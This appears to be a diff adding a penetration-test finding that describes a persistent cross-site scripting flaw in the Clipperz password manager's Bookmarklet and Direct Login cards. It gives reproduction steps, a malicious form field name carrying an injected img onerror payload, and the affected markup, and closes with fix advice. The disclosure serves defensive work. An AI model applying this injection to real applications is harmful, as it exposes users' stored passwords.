@@ -1,0 +1,69 @@
+CLP-01-014 Persistent XSS via Direct Login from Bookmarklet (Critical)
+
+Caused by missing output filtering, an attacker can abuse the
+Bookmarklet in combination with the creation of a new card of type
+?Direct Login? to persistently infect a Clipperz account and get full
+and transparent access to all data stored in the account including
+passwords, keystrokes and other sensitive data.
+
+Steps to Reproduce:
+Navigate to a maliciously prepared Website
+Use the Clipperz Bookmarklet
+Copy the generated JSON to create a Card
+Navigate to the Clipperz application
+Create a new card of type ?Direct Login?
+Paste the content and save (First XSS is triggerd)
+Create the card (Second XSS is triggered)
+
+Anytime the affected user navigates to the malicious card, the injected
+JavaScript is executed. This thereby effectively ?trojanizes? the entire
+Clipperz account and gives an attacker access to any of the stored cards
+and related passwords in plaintext.
+
+Example Markup for malicious page:
+<body>
+<form action=''>
+<input name='username' type='text'>
+<input name='password' type='password'>
+<input name='"><img src=x onerror=alert(domain)>' value='bla'>
+</form>
+
+Resulting JSON:
+{"page": {"title": ""},
+"form": {"attributes": {"action": "http://attacked/",
+"method": null},
+"inputs": [{"type": "text",
+"name": "username",
+"value": "root"},
+{"type": "password",
+"name": "password",
+"value": ""},
+{"type": "text",
+"name": "\"><img src=x onerror=alert(domain)>",
+"value": "bla"}]},
+"version": "0.2.3"}
+
+Affected Markup in Clipperz application:
+<tr id="elgen-1630"><td
+class="directLoginBindingLabelTD"><span>"&gt;&lt;img src=x
+onerror=alert(domain)&gt;</span></td><td
+class="directLoginBindingValueTD"><div style="display: none;"
+id="Clipperz_PM_Components_Panels_editModeBox_3947"><select
+id="Clipperz_PM_Components_Panels_select_3948"><option
+value="null">---</option><option
+value="014ab7a3d138834f883b0742857cd906fd1902e5c42303348fa181eb568695c1">username</option><option
+value="8e63b43adc66c2efb1ad9b61aa0e7184f12545eeb163ce076cbae05d5d6e0a45">password</option><option
+value="01a2b7d792deb70d98ad5f1bb0b3afd89de20554ba606be2662531c20dd6fd48"
+selected="true">"&gt;&lt;img src=x
+onerror=alert(domain)&gt;</option></select></div><div style="display:
+block;" id="Clipperz_PM_Components_Panels_viewModeBox_3949"><span
+id="Clipperz_PM_Components_Panels_viewValue_3950">"&gt;<img src="x"
+onerror="alert(domain)"></span></div></td></tr>
+
+It is highly recommended to escape and filter any output and consider
+the pages to pull login data from to be an adversary as well. Especially
+the content of the name field and other attributes of form elements
+should not be considered trusted as they can contain malicious data -
+similar to the form element?s value. All special HTML characters need to
+be converted into their corresponding HTML entities before displaying
+them to the user.
